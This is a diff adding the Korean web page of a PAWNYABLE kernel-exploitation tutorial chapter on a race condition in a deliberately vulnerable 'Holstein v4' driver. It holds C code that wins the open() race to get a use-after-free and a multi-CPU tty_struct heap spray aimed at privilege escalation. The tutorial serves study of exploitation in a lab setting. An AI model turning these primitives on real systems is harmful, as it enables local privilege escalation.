@@ -1,0 +1,322 @@
+<!DOCTYPE html>
+<html lang="kr">
+  <head>
+    <meta charset="UTF-8">
+<meta name="viewport"
+      content="width=device-width, initial-scale=1.0, maximum-scale=1.0, minimum-scale=1.0">
+<meta name="og:url" content="https://pawnyable.cafe//kr/linux-kernel/LK01/race_condition.html">
+
+    <meta name="og:title" content="Holstein v4: Race Condition - PAWNYABLE!">
+
+<meta name="og:image" content="https://pawnyable.cafe/pawnyable.ogp.png">
+<meta name="og:description" content="もふもふpwnワールド">
+<meta name="og:type" content="website">
+<meta name="og:site_name" content="PAWNYABLE!">
+
+<meta http-equiv="X-UA-Compatible" content="ie=edge">
+
+    <meta name="author" content="ptr-yudai">
+
+
+    <meta name="subtitle" content="pawnyable">
+
+
+    <meta name="description" content="Let's learn pwnable with cute animals.">
+
+
+    <meta name="keywords" content="linux,windows,kernel,browser,vm,exploit,exploitation,binary exploit,pwn,pwnable">
+
+
+
+
+<title>Holstein v4: Race Condition | PAWNYABLE!</title>
+
+
+
+    <link rel="icon" href="/favicon.png">
+
+
+
+<style>
+    @import url('https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700&family=Noto+Sans+SC:wght@300;400;500;700&family=Roboto+Mono&display=swap');
+</style>
+
+
+
+    <!-- stylesheets list from _config.yml -->
+    
+    <link rel="stylesheet" href="/css/style.css">
+    
+
+
+
+
+    <!-- scripts list from _config.yml -->
+    
+    <script src="/js/frame.js"></script>
+    
+
+
+
+
+
+
+
+  <style type="text/css">
+.spoiler {
+  display: inline;
+}
+p.spoiler {
+  display: flex;
+}
+.spoiler a {
+  pointer-events: none;
+}
+.spoiler-blur, .spoiler-blur > * {
+  transition: text-shadow .5s ease;
+}
+.spoiler .spoiler-blur, .spoiler .spoiler-blur > * {
+  color: rgba(0, 0, 0, 0);
+  background-color: rgba(0, 0, 0, 0);
+  text-shadow: 0 0 10px grey;
+  cursor: pointer;
+}
+.spoiler .spoiler-blur:hover, .spoiler .spoiler-blur:hover > * {
+  text-shadow: 0 0 5px grey;
+}
+.spoiler-box, .spoiler-box > * {
+  transition: color .5s ease,
+  background-color .5s ease;
+}
+.spoiler .spoiler-box, .spoiler .spoiler-box > * {
+  color: black;
+  background-color: black;
+  text-shadow: none;
+}</style><meta name="generator" content="Hexo 5.4.2"></head>
+  <body>
+    <div class="mask-border">
+    </div>
+
+    <div class="wrapper">
+
+      
+<div class="header">
+  <div class="flex-container">
+    <div class="header-inner">
+      <div class="site-brand-container">
+        <a href="/kr/">PAWNYABLE</a>
+      </div>
+      <div id="menu-btn" class="menu-btn" onclick="toggleMenu()">
+        Menu
+      </div>
+      <nav class="site-nav">
+        <ul class="menu-list">
+          
+            
+              <li class="menu-item">
+                <a href="/kr/practice/">Practice</a>
+              </li> 
+                   
+          
+            
+              <li class="menu-item">
+                <a href="/kr/about/">About</a>
+              </li> 
+                   
+          
+        </ul>
+      </nav>
+      
+<div class="language-switcher">
+  
+    
+      <a class="language-link" href="/linux-kernel/LK01/race_condition">JA</a>
+    
+  
+    
+      <a class="language-link" href="/en/linux-kernel/LK01/race_condition">EN</a>
+    
+  
+    
+      <a class="language-link language-link-active" href="/kr/linux-kernel/LK01/race_condition">KR</a>
+    
+  
+</div>
+
+    </div>
+  </div>
+</div>
+
+
+      <div class="main">
+        <div class="flex-container">
+          <article id="post">
+
+  
+    
+<div class="post-head">
+    <div class="post-info">
+        <div class="post-title">
+            
+                Holstein v4: Race Condition
+                        
+        </div>
+    </div>
+    <div class="h-line-primary"></div>
+    
+<div class="language-switcher">
+  
+    
+      <a class="language-link" href="/linux-kernel/LK01/race_condition">JA</a>
+    
+  
+    
+      <a class="language-link" href="/en/linux-kernel/LK01/race_condition">EN</a>
+    
+  
+    
+      <a class="language-link language-link-active" href="/kr/linux-kernel/LK01/race_condition">KR</a>
+    
+  
+</div>
+
+    
+        <div class="pagination">
+            <div class="pagination-bk"><a href="use_after_free.html">이전 페이지</a></div>
+            <div class="pagination-index"><a href="../index.html">목차</a></div>
+            <div class="pagination-fd"><a href="../LK02/null_ptr_deref.html">다음 페이지</a></div>
+        </div>
+    
+    
+        <div class="column" title="목차">
+            <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%ED%8C%A8%EC%B9%98-%EB%B6%84%EC%84%9D"><span class="toc-text">패치 분석</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Race-Condition"><span class="toc-text">Race Condition</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%EB%B0%9C%EC%83%9D-%EC%A1%B0%EA%B1%B4"><span class="toc-text">발생 조건</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%EA%B2%BD%EC%9F%81%EC%9D%84-%EC%84%B1%EA%B3%B5%EC%8B%9C%ED%82%A4%EA%B8%B0"><span class="toc-text">경쟁을 성공시키기</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#CPU%EC%99%80-Heap-Spray"><span class="toc-text">CPU와 Heap Spray</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%EA%B6%8C%ED%95%9C-%EC%83%81%EC%8A%B9"><span class="toc-text">권한 상승</span></a></li></ol>
+        </div>
+    
+</div>
+
+    <div class="post-content">
+    <p><a href="use_after_free.html">앞 장</a>에서는 Holstein 모듈의 Use-after-Free를 악용해 권한 상승에 성공했습니다. 세 번째 패치에서야 Holstein 모듈 개발자는 모듈을 수정해 Holstein v4를 공개했습니다. 개발자 말로는 이제 더 이상 취약점이 없고, 앞으로 업데이트도 없다고 합니다. 이 장에서는 최종판인 Holstein 모듈 v4를 익스플로잇합니다.</p>
+<h2 id="패치-분석">패치 분석</h2>
+<p>최종판 v4는 <a href="distfiles/LK01-4.tar.gz">여기</a>에서 다운로드할 수 있습니다. 먼저 v3와의 차이를 봅시다.<br>
+먼저 부팅 스크립트 <code>run.sh</code>는 멀티코어로 동작하도록 바뀌었습니다.</p>
+<figure class="highlight diff"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="deletion">-    -smp 1 \</span></span><br><span class="line"><span class="addition">+    -smp 2 \</span></span><br></pre></td></tr></table></figure>
+<p>프로그램 쪽은 메모리 누수와 Use-after-Free가 수정되었습니다.<br>
+첫 번째 수정은 <code>open</code>입니다. 이미 누군가 드라이버를 열고 있는 경우 변수 <code>mutex</code>가 1이 되어 <code>open</code>이 실패하도록 설계되었습니다.</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> mutex = <span class="number">0</span>;</span><br><span class="line"><span class="type">char</span> *g_buf = <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">int</span> <span class="title function_">module_open</span><span class="params">(<span class="keyword">struct</span> inode *inode, <span class="keyword">struct</span> file *file)</span></span><br><span class="line">&#123;</span><br><span class="line">  printk(KERN_INFO <span class="string">&quot;module_open called\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (mutex) &#123;</span><br><span class="line">    printk(KERN_INFO <span class="string">&quot;resource is busy&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> -EBUSY;</span><br><span class="line">  &#125;</span><br><span class="line">  mutex = <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">  g_buf = kzalloc(BUFFER_SIZE, GFP_KERNEL);</span><br><span class="line">  <span class="keyword">if</span> (!g_buf) &#123;</span><br><span class="line">    printk(KERN_INFO <span class="string">&quot;kmalloc failed&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> -ENOMEM;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>즉 <code>open</code> 도중에 드라이버를 다시 여는 것은 불가능해졌습니다. 열린 파일 디스크립터를 <code>close</code>하면 <code>mutex</code>가 0으로 돌아가고 다시 <code>open</code>할 수 있습니다.</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">int</span> <span class="title function_">module_close</span><span class="params">(<span class="keyword">struct</span> inode *inode, <span class="keyword">struct</span> file *file)</span></span><br><span class="line">&#123;</span><br><span class="line">  printk(KERN_INFO <span class="string">&quot;module_close called\n&quot;</span>);</span><br><span class="line">  kfree(g_buf);</span><br><span class="line">  mutex = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>그렇다면 취약점은 어디에 있을까요? 잠깐 생각해 봅시다.</p>
+<h2 id="Race-Condition">Race Condition</h2>
+<p>이번 드라이버 구현은 완벽해 보일 수도 있지만, 사실은 여전히 <strong>여러 프로세스가 하나의 리소스에 접근하는 상황</strong>을 완전히 고려하지 못했습니다.<br>
+OS는 여러 프로세스나 스레드를 동시에 실행하기 위해 컨텍스트 스위치를 구현하며, 이 전환은 함수 단위 같은 큰 단위가 아니라 명령어 단위<sup class="footnote-ref"><a href="#fn1" id="fnref1">[1]</a></sup>로도 일어납니다. 당연히 <code>module_open</code> 함수가 실행되는 도중에도 컨텍스트가 바뀔 수 있습니다.<br>
+이 장에서는 이런 멀티스레드, 멀티프로세스 상황에서 발생하는 **경합 문제(Race Condition)**를 악용해 익스플로잇을 작성합니다.</p>
+<h3 id="발생-조건">발생 조건</h3>
+<p>먼저 경쟁 상태가 어떤 결과를 낳는지 생각해 봅시다. 예를 들어 다음과 같은 순서로 컨텍스트 스위치가 일어났다고 가정합니다.</p>
+<center>
+  <img src="img/race1.png" alt="멀티스레드에서의 정상 동작 예시" style="width:620px;">
+</center>
+<p>처음에 <code>mutex</code>에는 0이 들어 있으므로 스레드 1은 조건 분기에서 점프해 <code>g_buf</code>를 할당하는 경로에 도달합니다. 그리고 파란색 명령에서 <code>g_buf</code>에 주소가 들어갑니다.<br>
+이후 컨텍스트 스위치가 발생해 실행이 스레드 2로 넘어갑니다. 이때 스레드 2 입장에서는 <code>mutex</code>에 이미 1이 들어 있으므로 조건 분기에서 점프하지 않고, <code>EBUSY</code>를 반환하는 경로에 도달해 <code>open</code>이 실패합니다.<br>
+따라서 이 예시는 개발자가 의도한 대로 <code>module_open</code>이 동작합니다.<br>
+이제 아래 그림과 같은 실행 순서를 생각해 봅시다.</p>
+<center>
+  <img src="img/race2.png" alt="Race Condition에 빠지는 동작 예시" style="width:620px;">
+</center>
+<p>앞과 마찬가지로 스레드 1은 <code>g_buf</code>를 할당하는 경로에 도달합니다. 하지만 이번에는 <code>mutex</code>에 1을 넣기 전에 컨텍스트 스위치가 발생합니다.<br>
+그러면 스레드 2가 조건 분기를 검사할 시점에도 <code>mutex</code>에는 아직 0이 들어 있으므로, 스레드 2 역시 <code>g_buf</code>를 할당하는 경로로 진입합니다. 그리고 파란색 명령에서 할당된 주소가 <code>g_buf</code>에 들어갑니다.<br>
+이후 다시 컨텍스트 스위치가 발생해 실행이 스레드 1로 돌아오면, 스레드 1도 버퍼를 할당하고 빨간색 명령으로 그 주소를 <code>g_buf</code>에 저장합니다.<br>
+결국 두 스레드 모두 <code>open</code>에 성공하게 되고, 스레드 1이 할당한 주소를 양쪽 스레드가 모두 사용하는 상태가 됩니다.</p>
+<p>이처럼 커널 공간 코드를 설계할 때는 항상 멀티스레드를 고려해야 합니다. 그렇지 않으면 이런 버그가 생깁니다.</p>
+<div class="balloon_l">
+  <div class="faceicon"><img src="../img/wolf_atamawaru.png" alt="늑대" ></div>
+  <p class="says">
+   변수 <code>mutex</code>를 읽고 쓸 때 atomic 연산을 사용하지 않았기 때문에 생긴 경쟁이야.
+  </p>
+</div>
+<p><code>open</code>이 두 번 성공하면, 한쪽에서 <code>close</code>가 호출된 뒤에도 <code>g_buf</code>는 해제된 포인터를 계속 가리키므로, 앞 장과 같은 Use-after-Free를 일으킬 수 있습니다.</p>
+<h3 id="경쟁을-성공시키기">경쟁을 성공시키기</h3>
+<p>먼저 <code>open</code> 경쟁이 실제로 가능한지 코드를 작성해 확인해 봅시다.<br>
+여러 스레드에서 <code>open</code>을 계속 호출하면 경쟁 자체는 쉽게 발생하지만, 성공했는지 판정할 방법이 필요합니다. 판정 방법은 다양하지만, 기본적으로는 두 스레드에서 <code>read</code>를 해 보고 둘 다 성공하면 성공으로 보는 것이 자연스럽습니다. 다만 이번에는 불필요한 <code>read</code> 호출을 줄이기 위해 파일 디스크립터를 확인하기로 했습니다. 두 스레드 모두 <code>open</code>에 성공한 경우, 반드시 한쪽의 파일 디스크립터는 4가 되기 때문입니다.<br>
+저자는 아래처럼 같은 함수를 2개의 스레드에서 돌려 경쟁 상태를 만드는 코드를 작성했습니다. 물론 메인 스레드에서 루프를 돌려도 되고, 경쟁 성공 판정 방법도 각자 원하는 방식으로 설계해도 됩니다. 컴파일할 때 <code>-lpthread</code>를 넣어 <code>libpthread</code>를 링크하는 것을 잊지 마세요.</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span>* <span class="title function_">race</span><span class="params">(<span class="type">void</span> *arg)</span> &#123;</span><br><span class="line">  <span class="keyword">while</span> (<span class="number">1</span>) &#123;</span><br><span class="line">    <span class="comment">// 어느 한쪽 스레드에서 fd가 4가 될 때까지 경쟁 시도</span></span><br><span class="line">    <span class="keyword">while</span> (!win) &#123;</span><br><span class="line">      <span class="type">int</span> fd = open(<span class="string">&quot;/dev/holstein&quot;</span>, O_RDWR);</span><br><span class="line">      <span class="keyword">if</span> (fd == <span class="number">4</span>) win = <span class="number">1</span>;</span><br><span class="line">      <span class="keyword">if</span> (win == <span class="number">0</span> &amp;&amp; fd != <span class="number">-1</span>) close(fd);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 상대 스레드가 우연히 fd를 닫아 버리지 않았는지 확인</span></span><br><span class="line">    <span class="keyword">if</span> (write(<span class="number">3</span>, <span class="string">&quot;A&quot;</span>, <span class="number">1</span>) != <span class="number">1</span> || write(<span class="number">4</span>, <span class="string">&quot;a&quot;</span>, <span class="number">1</span>) != <span class="number">1</span>) &#123;</span><br><span class="line">      <span class="comment">// 실패</span></span><br><span class="line">      close(<span class="number">3</span>);</span><br><span class="line">      close(<span class="number">4</span>);</span><br><span class="line">      win = <span class="number">0</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">      <span class="comment">// 성공</span></span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">  <span class="type">pthread_t</span> th1, th2;</span><br><span class="line"></span><br><span class="line">  pthread_create(&amp;th1, <span class="literal">NULL</span>, race, <span class="literal">NULL</span>);</span><br><span class="line">  pthread_create(&amp;th2, <span class="literal">NULL</span>, race, <span class="literal">NULL</span>);</span><br><span class="line">  pthread_join(th1, <span class="literal">NULL</span>);</span><br><span class="line">  pthread_join(th2, <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line">  <span class="type">char</span> buf[<span class="number">0x400</span>];</span><br><span class="line">  <span class="type">int</span> fd1 = <span class="number">3</span>, fd2 = <span class="number">4</span>;</span><br><span class="line">  write(fd1, <span class="string">&quot;Hello&quot;</span>, <span class="number">5</span>);</span><br><span class="line">  read(fd2, buf, <span class="number">5</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;%s\n&quot;</span>, buf);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>이렇게 하면 거의 100% 확률로 경쟁에 성공한다는 것을 알 수 있습니다. 성공까지 걸리는 시간도 밀리초 단위라서, primitive로 쓰기에 충분합니다.</p>
+<div class="column" title="칼럼: Race condition과 Data race">
+  "race condition"과 "data race"는 비슷하게 들리지만 같은 뜻이 아니며, 서로를 보완하는 병렬 용어도 아닙니다.<br>
+  data race는 두 스레드가 같은 메모리 위치를 동시에(비동기적으로) 접근하고, 그중 적어도 하나가 쓰기인 상태를 의미합니다. 따라서 data race는 정의되지 않은 동작을 일으킵니다. 이는 적절한 배타 제어나 atomic 연산으로 해결할 수 있습니다.<br>
+  반면 race condition은 멀티스레드의 실행 순서에 따라 다른 결과가 나오는 상태를 의미합니다. 이는 로직 버그와 비슷하게 "프로그래머가 그렇게 작성했기 때문에 그렇게 동작하는" 경우입니다. 예상치 못한 동작은 일어나지만, 그것이 곧 정의되지 않은 동작을 의미하는 것은 아닙니다. 멀티스레드 때문에 프로그래머 의도와 다른 결과가 나오면 race condition 버그가 있다고 할 수 있습니다.<br>
+  이번 드라이버에는 구현 실수로 인한 race condition이 있고, 그 결과 버퍼 포인터에 대한 data race도 발생합니다.
+</div>
+<h2 id="CPU와-Heap-Spray">CPU와 Heap Spray</h2>
+<p>이번처럼 멀티스레드로 경쟁 익스플로잇을 구현하는 일은 자주 있는데, 이때 하나 더 주의할 점이 있습니다.<br>
+여러 스레드가 경쟁 상태를 만들고 있다는 것은 공격 시 여러 CPU 코어가 사용된다는 뜻입니다. 그러면 당연히 그중 하나의 CPU 코어에서 <code>module_open</code>이 호출되어 <code>kzalloc</code>으로 메모리 영역을 할당합니다.<br>
+여기서 예전에 Heap Overflow 장에서 설명한 <a href="heap_overflow#slub-allocator">SLUB allocator</a>의 특징을 떠올려 봅시다. SLUB allocator는 객체 할당에 사용하는 slab을 CPU별 메모리 영역으로 관리합니다.<br>
+즉 지금 <code>main</code> 함수가 실행 중인 스레드와 다른 CPU 코어에서 할당된 <code>g_buf</code>가 <code>kfree</code>되면, 그 메모리는 그 CPU 코어에 대응하는 slab으로 다시 연결됩니다. 그러면 이후 <code>main</code> 스레드에서만 Heap Spray를 해서는, <code>kfree</code>된 <code>g_buf</code>와 겹치지 않습니다.<br>
+따라서 이번 같은 상황에서는 <strong>Heap Spray도 여러 스레드에서 수행하도록</strong> 주의해야 합니다.</p>
+<p>또한 <code>/dev/ptmx</code>를 열면 새로운 파일 디스크립터가 생성되는데, 한 프로세스가 만들 수 있는 파일 디스크립터 수에는 한계가 있습니다. 대량 spray가 필요할 때는, spray가 맞았다고 판단한 시점에 관련 없는 파일 디스크립터를 닫는 식의 정리도 필요합니다.</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span>* <span class="title function_">spray_thread</span><span class="params">(<span class="type">void</span> *args)</span> &#123;</span><br><span class="line">  <span class="type">long</span> x;</span><br><span class="line">  <span class="type">long</span> spray[<span class="number">800</span>];</span><br><span class="line"></span><br><span class="line">  <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">800</span>; i++) &#123;</span><br><span class="line">    usleep(<span class="number">10</span>);</span><br><span class="line">    <span class="comment">// tty_struct spray</span></span><br><span class="line">    spray[i] = open(<span class="string">&quot;/dev/ptmx&quot;</span>, O_RDONLY | O_NOCTTY);</span><br><span class="line">    <span class="keyword">if</span> (spray[i] == <span class="number">-1</span>) &#123;</span><br><span class="line">      <span class="keyword">for</span> (<span class="type">int</span> j = <span class="number">0</span>; j &lt; i; j++)</span><br><span class="line">        close(spray[j]);</span><br><span class="line">      <span class="keyword">return</span> (<span class="type">void</span>*)<span class="number">-1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (read(fd2, &amp;x, <span class="keyword">sizeof</span>(<span class="type">long</span>)) == <span class="keyword">sizeof</span>(<span class="type">long</span>) &amp;&amp; x) &#123;</span><br><span class="line">      <span class="comment">// hit</span></span><br><span class="line">      <span class="keyword">for</span> (<span class="type">int</span> j = <span class="number">0</span>; j &lt; i; j++)</span><br><span class="line">        close(spray[j]);</span><br><span class="line">      <span class="keyword">return</span> (<span class="type">void</span>*)spray[i];</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">800</span>; i++)</span><br><span class="line">    close(spray[i]);</span><br><span class="line">  <span class="keyword">return</span> (<span class="type">void</span>*)<span class="number">-1</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">...</span><br><span class="line"></span><br><span class="line">  <span class="comment">// Use-after-Free 만들기</span></span><br><span class="line">  close(fd1);</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* 여러 코어에서 Heap Spray */</span></span><br><span class="line">  <span class="type">long</span> victim_fd = <span class="number">-1</span>;</span><br><span class="line">  <span class="comment">// 먼저 메인 스레드에서 시도</span></span><br><span class="line">  victim_fd = (<span class="type">long</span>)spray_thread(<span class="literal">NULL</span>);</span><br><span class="line">  <span class="comment">// 메인 스레드에서 실패하면 다른 스레드 결과 사용</span></span><br><span class="line">  <span class="keyword">while</span> (victim_fd == <span class="number">-1</span>) &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[+] spraying on another CPU...&quot;</span>);</span><br><span class="line">    pthread_create(&amp;th1, <span class="literal">NULL</span>, spray_thread, <span class="literal">NULL</span>);</span><br><span class="line">    pthread_join(th1, (<span class="type">void</span>*)&amp;victim_fd);</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure>
+<div class="balloon_l">
+  <div class="faceicon"><img src="../img/wolf_normal.png" alt="늑대" ></div>
+  <p class="says">
+   <code>sched_setaffinity</code> 함수를 쓰면 스레드가 사용할 CPU를 제한할 수 있어서, 코어 수가 늘어나도 2코어일 때와 비슷한 동작을 강제할 수 있어.
+  </p>
+</div>
+<h2 id="권한-상승">권한 상승</h2>
+<p>이제부터는 앞서와 같은 방식으로 권한 상승을 하면 됩니다.<br>
+데이터 경쟁으로 Use-after-Free를 만들고, 그 위에 Heap Spray로 <code>tty_struct</code>를 올리는 흐름입니다. 이 과정을 함수로 묶어 두면 Use-after-Free를 여러 번 발생시키는 코드도 쉽게 작성할 수 있습니다.</p>
+<p>샘플 익스플로잇은 <a href="exploit/race-krop.c">여기</a>에서 다운로드할 수 있습니다.</p>
+<center>
+  <img src="img/race_privesc.png" alt="Race Condition을 통한 권한 상승" style="width:320px;">
+</center>
+<p>Race condition 익스플로잇은 디버깅이 어렵기 때문에, 이론이 실제로 구현 가능한지와 높은 확률로 안정적으로 race를 일으키는 primitive를 만들 수 있는지가 개발의 핵심이 됩니다.</p>
+<hr>
+<div class="column" title="예제">
+  qemu 부팅 옵션에서 CPU 코어 수를 4나 8로 늘렸을 때, 여러분이 작성한 exploit의 race와 spray가 어느 정도 확률로 동작하는지 확인해 봅시다.<br>
+  또한 실패 확률이 높다면, 코어 수에 의존하지 않고 높은 확률로 동작하도록 exploit을 수정해 봅시다.
+</div>
+<hr class="footnotes-sep">
+<section class="footnotes">
+<ol class="footnotes-list">
+<li id="fn1" class="footnote-item"><p>CPU에 따라서는 최적화를 위해 명령 실행 순서가 바뀌는 더 미세한 수준의 문제도 있지만, 이번에는 관련이 없으므로 설명하지 않습니다. <a href="#fnref1" class="footnote-backref">↩︎</a></p>
+</li>
+</ol>
+</section>
+
+</div> 
+
+<div style="margin-top: 1em">
+    <div class="h-line-primary"></div>
+    
+        <div class="pagination">
+            <div class="pagination-bk"><a href="use_after_free.html">前のページへ</a></div>
+            <div class="pagination-index"><a href="../index.html">目次へ</a></div>
+            <div class="pagination-fd"><a href="../LK02/null_ptr_deref.html">次のページへ</a></div>
+        </div>
+    
+</div>
+
+<script>
+    window.onload = detectors();
+</script>
+
+  
+</article>
+        </div>
+      </div>
+      
+      <div class="footer">
+    <div class="flex-container">
+        <div class="footer-text">
+            
+                © 2023 ptr-yudai 🐈
+                <br>
+            
+            
+                
+        </div>
+    </div>
+</div>
+
+    </div>
+
+  </body>
+</html>
